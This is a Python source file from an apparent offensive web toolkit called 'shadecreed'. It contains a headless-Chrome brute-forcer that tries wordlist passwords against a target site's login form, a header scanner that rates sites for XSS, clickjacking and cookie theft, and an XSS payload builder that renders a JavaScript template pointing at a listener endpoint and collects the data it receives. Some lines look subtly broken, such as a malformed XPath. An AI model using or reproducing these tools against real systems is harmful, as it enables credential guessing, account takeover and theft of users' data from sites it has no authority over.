import os,sys,json,time,httpx,argparse,signal
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from shadecreed.ux.anime import wr,wrdic,wrdel,wrtime,wrcold,wrloader
from shadecreed.ux.ascii import red,blue,yellow,green,plain,bruteAssist,xssStart
from shadecreed.ux.process import skim
from shadecreed.core.headers.network.proxy import readCache, proxyTest
from bs4 import BeautifulSoup as bs
from jinja2 import Template
from shadecreed.core.middleware.drive import drive
from shadecreed.core.utils.base import base_dir,password_dir

def buildConfig(placeholder,submit,sub_tag):
  target= readCache()['target']
  if target:
    built = dict()
    built['targetweb'] = target
    with open(f'{base_dir}/core/utils/build.json', 'w') as builtconfig:
      for count in range(len(placeholder)):
        built[f'{placeholder[count]}'] = str(placeholder[count])
      built['sub_tag'] = sub_tag
      built['click'] = str(submit[0].strip())
      
      failed = input('Enter the page\'s failed response : ')
      built['failed'] = failed
      json.dump(built,builtconfig,indent=2)
    wr(f'[+] Automation config has been setup ✅\n')
    runBrute()
  else:
    wr('[+] Failed to retrieve session target')
    
def runBrute():
  use = dict()
  if os.path.exists(f'{base_dir}/core/utils/build.json'):
    with open(f'{base_dir}/core/utils/build.json') as configo:
      config = json.load(configo)
      target = readCache()['target']
      if target == config['targetweb']:
        while True:
          wr(bruteAssist())
          for key, value in config.items():
            if key not in ("targetweb","sub_tag","click","failed"):
              input_ = input(f'[{key}] : ')
              if input_:
                use[key] = input_.strip()
          not_brute = {k:v for k,v in use.items() if v != 'brute'}
          is_brute = {k:v for k,v in use.items() if v == 'brute'}
          use={**not_brute,**is_brute}
          if use:
            break
        option = webdriver.ChromeOptions()
        option.add_argument('--headless=new')
        option.add_argument('--disable-gpu')
        option.add_argument('--no-sandbox')
        option.add_argument('--incognito')
        option.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        option.add_argument('--disable-blink-features=AutomationControlled')
        option.add_argument('--ignore-certificate-errors')
      
        driver = webdriver.Chrome(options = option)
        if os.path.exists(f'{password_dir}/passwords.txt'):
          with open(f'{password_dir}/passwords.txt') as passlist:
            pass_ = [each.strip() for each in passlist.readlines() if each.strip()]
            for i in range(len(pass_[:10])):
              try:
                driver.get(target)
                wrloader(15)
                wait = WebDriverWait(driver,60)
                for key,value in use.items():
                  if value.strip().lower() != 'brute':
                    wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, f'input[placeholder="{key}"]')))
                    enter = driver.find_element(By.CSS_SELECTOR, f'input[placeholder="{key}"]')
                    enter.clear()
                    enter.send_keys(value)
                  else:
                    wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, f'input [placeholder ="{key}"]')))
                    enter = driver.find_element(By.CSS_SELECTOR, f'input [placeholder="{key}"]')
                    enter.clear()
                    enter.send_keys(pass_[i])
                wait.until(EC.element_to_be_clickable((By.XPATH, f'//{config['sub_tag']}[contains(text(),"{config['click']}")]')))
                submit = driver.find_element(By.XPATH,f'//{config['sub_tag']} contains[text(), "{config['click']}"]')
                submit.click()
                wrcold(f'Trying - {pass_[i]}')
                page_text = bs(driver.page_source, 'html-parser').text
                if f'{config['failed']}' in page_text:
                  wrcold(f'Incorrect - {pass_[i]}',co=red,timeout=3)
                else:
                  wrcold(page_text)
              except KeyboardInterrupt:
                break
              except Exception as error:
                print(f'{red}{error}{plain}')
                driver.quit()
        else:
          wr('%s not found'%passwords, co=red)

def analyzeHeaders(url):
  report = {}
  if isinstance(url, dict):
    headers = url
  else:
    response = httpx.request('GET',url,follow_redirects=True)
    headers = dict(response.headers)
  # Normalize header keys (case-insensitive)
  headers = {k.lower(): v for k, v in headers.items()}
  
    # 1. Content-Security-Policy (CSP)
  csp = headers.get("content-security-policy", "")
  if not csp:
    report["CSP"] = "Not set - XSS friendly"
  elif "'unsafe-inline'" in csp or "'unsafe-eval'" in csp:
    report["CSP"] = f"Weak CSP -> contains {', '.join(d for d in ['unsafe-inline', 'unsafe-eval'] if d in csp)}"
  else:
    report["CSP"] = "Strong CSP -> payloads may be blocked"

    # 2. X-Content-Type-Options
  xcto = headers.get("x-content-type-options", "")
  if xcto.lower() == "nosniff":
      report["X-Content-Type-Options"] = "nosniff enabled -> MIME spoofing blocked"
  else:
      report["X-Content-Type-Options"] = "nosniff not set -> possible MIME tricks"

    # 3. X-Frame-Options
  xfo = headers.get("x-frame-options", "")
  if xfo:
    report["X-Frame-Options"] = f"Framing blocked: {xfo}"
  else:
      report["X-Frame-Options"] = "Framing allowed -> clickjacking possible"

    # 4. Access-Control-Allow-Origin
  acao = headers.get("access-control-allow-origin", "")
  if acao == "*":
    report["CORS"] = "Wide open CORS -> exfil via fetch possible"
  elif acao:
    report["CORS"] = f"CORS limited to: {acao}"
  else:
    report["CORS"] = "CORS not set -> restricts cross-origin JS fetch"

    # 5. Referrer-Policy
  refpol = headers.get("referrer-policy", "")
  if refpol in ["no-referrer", "strict-origin"]:
    report["Referrer-Policy"] = f"Limited referrer: {refpol}"
  elif not refpol:
    report["Referrer-Policy"] = "Not set -> referrer leaks possible"
  else:
    report["Referrer-Policy"] = f"Moderate: {refpol}"

    # 6. Set-Cookie
  cookies = headers.get("set-cookie", "")
  if cookies:
    if "httponly" in cookies.lower():
      report["Cookies"] = "HttpOnly -> JS can't access cookies"
    else:
      report["Cookies"] = "HttpOnly not set -> document.cookie exploitable"
  else:
    report["Cookies"] = "No Set-Cookie header"

    # 7. Content-Type
  ctype = headers.get("content-type", "")
  if "text/html" in ctype:
    report["Content-Type"] = "text/html -> XSS possible"
  else:
    report["Content-Type"] = f"Non-HTML: {ctype}"

    # 8. Server Banner (optional)
  server = headers.get("server", "")
  if server:
    report["Server"] = f"{server} -> check for known CVEs"
  else:
    report["Server"] = "Server banner not exposed"

  wrdic(report,co='\x1b[1;32m')

def runAnalyzeHeaders():
  parse = argparse.ArgumentParser(description="shadecreed : toolkit; xss vulnerebility scan ")
  parse.add_argument('--url',help="<target_url>",required=True)
  args = parse.parse_args()
  if args.url:
    if args.url.startswith('http'):
      analyzeHeaders(args.url)
    else:
      wr(f'{args.url} is not a valid http address')
    
redefine = lambda text : ''.join(' ' if c == '_' else c for c in text)

def runBuildXss():
  parser = argparse.ArgumentParser(description="shadecreed : toolkit; customize, forge and deploy payload to custom dynamic endpoints")
  parser.add_argument('--url', help="<target_url>", required=True)
  parser.add_argument('--script', help="script path")
  parser.add_argument('--endpoint',help="custom endpoint")
  args = parser.parse_args()
  
  if args.url:
    if args.url.startswith('http'):
      buildXss(url=args.url, template=args.script if args.script else None,endpoint=args.endpoint if args.endpoint else None)
    else:
      wr(f'{args.url} is not a valid http address')
    
def buildXss(url=None,template=None,endpoint=None):
  if url:
    analyzeHeaders(dict(httpx.request('GET',url,follow_redirects=True).headers))
  else:
    analyzeHeaders(readCache())
  try:
    wr(xssStart())
    if endpoint == None:
      silent = input('Live stream received datas [ Y/N ] : ').strip()
      if isinstance(silent, str) and silent.lower() != 'q':
        xss = drive(silence_process=True if silent.lower() in ('yes','y') else False)
        xss.start()
      elif silent.lower() in ('q','quit'):
        os.kill(os.getpid(), signal.SIGINT)
    context = {'endpoint' : endpoint if endpoint != None else xss.endpoint()}
        
    if template:
      if os.path.exists(template):
        with open(template, 'r') as temp:
          templated = Template(temp.read())
      else:
        wr(f'{template} was not found')
        sys.exit()
    else:
      with open(f'{base_dir}/core/library/template.js') as temp:
        templated = Template(temp.read())
        
    script_to_render = templated.render(context)
    with open(f'{base_dir}/app/static/payload.js', 'w') as script:
      script.write(script_to_render)
      
    
    try:
      if silent or not silent:
        if silent.lower() in ('no','n',''):
          wrcold('Currently unable to log received datas',co='\x1b[1;33m',timeout=3)
        wr('Grab a coffee ☕, this might take a while')
        wr('`ctrl+c` to close session',co='\x1b[1;31m')
        xss.listen()
    except UnboundLocalError:
      if template != None or endpoint != None:
        wr(script_to_render)
      
  except KeyboardInterrupt:
    print('\n')
  
    
  
if __name__ == '__main__':
  pass
    